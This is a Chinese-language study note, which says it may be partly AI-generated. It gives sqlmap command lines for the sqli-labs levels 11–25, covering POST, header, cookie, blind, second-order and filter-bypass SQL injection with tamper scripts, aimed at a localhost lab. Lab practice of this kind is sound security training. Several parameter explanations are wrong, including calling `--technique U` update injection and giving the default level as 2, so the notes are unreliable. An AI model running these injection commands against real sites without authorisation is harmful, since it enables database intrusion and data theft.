# sqli-labs Less11-25 sqlmap 命令笔记

sqli-labs Less11-25 主要覆盖 **POST型注入**、**HTTP头注入**、**Cookie注入**、**盲注**、**过滤绕过**、**二次注入** 等场景，以下是针对每个关卡的 sqlmap 实战命令及核心参数解释，帮助你快速掌握不同场景下的 sqlmap 使用方法。

## 前置准备

1. 确保 sqli-labs 环境正常运行（目标 URL 示例：`http://127.0.0.1/sqli-labs/`）；

2. 用 Burp Suite 抓取对应关卡的 HTTP 请求包，保存为 `req.txt`（POST/头注入必备）；

3. sqlmap 基础语法：`sqlmap [参数] -u "目标URL" --batch`（`--batch` 自动回答所有交互问题）。

---

## 各关卡 sqlmap 命令及解析

### Less11：POST 单引号字符型注入（用户名密码处）

**核心场景**：POST 请求的 `uname`/`passwd` 参数单引号闭合注入，有回显。

#### 方法1：直接指定 POST 数据

```Bash

sqlmap -u "http://127.0.0.1/sqli-labs/Less-11/" --data "uname=admin&passwd=admin&submit=Submit" -p uname --batch
```

#### 方法2：加载抓包文件（推荐）

```Bash

sqlmap -r req.txt -p uname --batch
```

**参数解释**：

- `--data`：指定 POST 提交的数据；

- `-p`：指定注入点参数（`uname` 或 `passwd` 均可）。

### Less12：POST 双引号+括号字符型注入

**核心场景**：POST 参数需用 `"`) 闭合（如 `uname="1") #`）。

```Bash

sqlmap -r req.txt -p uname --dbms mysql --batch --tamper=apostrophemask
```

**参数解释**：

- `--dbms mysql`：指定数据库类型为 MySQL（加速检测）；

- `--tamper=apostrophemask`：用 UTF-8 编码替换单引号（可选，辅助闭合检测）。

### Less13：POST 单引号+括号，无回显（布尔/时间盲注）

**核心场景**：无回显、无报错，仅能通过布尔判断或时间延迟注入。

```Bash

sqlmap -r req.txt -p uname --technique BT --batch --time-sec 2
```

**参数解释**：

- `--technique BT`：指定注入技术（B=布尔盲注，T=时间盲注）；

- `--time-sec 2`：时间盲注的延迟时间（2秒）。

### Less14：POST 双引号，无回显（布尔/时间盲注）

**核心场景**：双引号闭合，无回显，仅盲注。

```Bash

sqlmap -r req.txt -p uname --technique BT --batch --tamper=space2comment
```

**参数解释**：`--tamper=space2comment`：用注释替换空格（应对可能的空格过滤）。

### Less15：POST 单引号，纯布尔盲注（无报错/无回显）

```Bash

sqlmap -r req.txt -p uname --technique B --batch --level 3
```

**参数解释**：

- `--technique B`：仅使用布尔盲注；

- `--level 3`：提高检测级别（默认2，级别越高检测越全面）。

### Less16：POST 双引号+括号，纯布尔盲注

```Bash

sqlmap -r req.txt -p uname --technique B --batch --risk 2
```

**参数解释**：`--risk 2`：提高风险级别（默认1，风险越高尝试的注入payload越多）。

### Less17：POST 密码重置（更新查询），单引号报错注入

**核心场景**：密码重置功能，`passwd` 参数单引号闭合，报错注入。

```Bash

sqlmap -r req.txt -p passwd --technique E --batch
```

**参数解释**：`--technique E`：仅使用报错注入（ExtractError）。

### Less18：POST User-Agent 头注入（单引号字符型）

**核心场景**：注入点在 User-Agent 头，而非 POST 参数。

```Bash

sqlmap -r req.txt -p User-Agent --batch --level 5
```

**参数解释**：

- `-p User-Agent`：指定注入点为 User-Agent 头；

- `--level 5`：最高检测级别（头注入需级别≥3才会检测HTTP头）。

### Less19：POST Referer 头注入（单引号字符型）

**核心场景**：注入点在 Referer 头。

```Bash

sqlmap -r req.txt -p Referer --batch --level 5
```

### Less20：POST Cookie 注入（单引号字符型，有回显）

**核心场景**：注入点在 Cookie 的 `uname` 参数（登录后产生）。

#### 方法1：加载抓包文件

```Bash

sqlmap -r req.txt -p Cookie --batch
```

#### 方法2：直接指定 Cookie

```Bash

sqlmap -u "http://127.0.0.1/sqli-labs/Less-20/" --cookie "uname=admin" -p uname --batch
```

### Less21：POST Cookie 注入（单引号+括号，Base64 编码）

**核心场景**：Cookie 内容被 Base64 编码，需先解码注入再编码。

```Bash

sqlmap -r req.txt -p Cookie --batch --tamper=base64encode --level 5
```

**参数解释**：`--tamper=base64encode`：自动对 payload 进行 Base64 编码（适配 Cookie 编码场景）。

### Less22：POST Cookie 注入（双引号，Base64 编码）

```Bash

sqlmap -r req.txt -p Cookie --batch --tamper=base64encode,apostrophemask --level 5
```

### Less23：GET 型单引号，过滤注释符（--+ # 被过滤）

**核心场景**：GET 参数 `id` 单引号闭合，但注释符（`--+`、`#`）被过滤，需用字符闭合。

```Bash

sqlmap -u "http://127.0.0.1/sqli-labs/Less-23/?id=1" -p id --batch --tamper=space2plus
```

**参数解释**：`--tamper=space2plus`：用 `+` 替换空格（应对空格过滤）。

### Less24：二次注入（存储型）

**核心场景**：先注册恶意账号（如 `admin'#`），再登录修改密码触发注入，sqlmap 直接检测较难，需手动配合：

1. 注册账号：`username=test'#&password=123456`；

2. 登录该账号，抓修改密码的请求包保存为 `req24.txt`；

3. 执行 sqlmap 检测：

```Bash

sqlmap -r req24.txt -p passwd --batch --technique U
```

**参数解释**：`--technique U`：更新型注入（适配密码修改的 UPDATE 语句）。

### Less25：GET 型，过滤 or/and（大小写/双写绕过）

**核心场景**：过滤 `or`/`and`，需用双写（`oorr`）或大小写（`OR`）绕过。

```Bash

sqlmap -u "http://127.0.0.1/sqli-labs/Less-25/?id=1" -p id --batch --tamper=doubleencode,space2comment
```

**参数解释**：`--tamper=doubleencode`：双重 URL 编码（辅助绕过关键字过滤）。

---

## 总结

### 核心参数回顾

1. **POST/头注入核心**：`-r 抓包文件` 加载请求，`-p 注入点` 指定参数/头字段（如 User-Agent/Referer/Cookie）；

2. **盲注/无回显**：`--technique BT` 指定布尔/时间盲注，`--time-sec` 设置延迟时间；

3. **过滤/编码绕过**：`--tamper` 加载绕过脚本（base64encode、doubleencode 等），`--level/risk` 提高检测级别；

### 关键注意事项

1. HTTP 头注入（UA/Referer/Cookie）需设置 `--level ≥3` 才会被检测；

2. Base64 编码场景需用 `--tamper=base64encode` 自动编码 payload；

3. 二次注入（Less24）sqlmap 直接检测效果有限，需先手动构造恶意输入再检测。
> （注：文档部分内容可能由 AI 生成）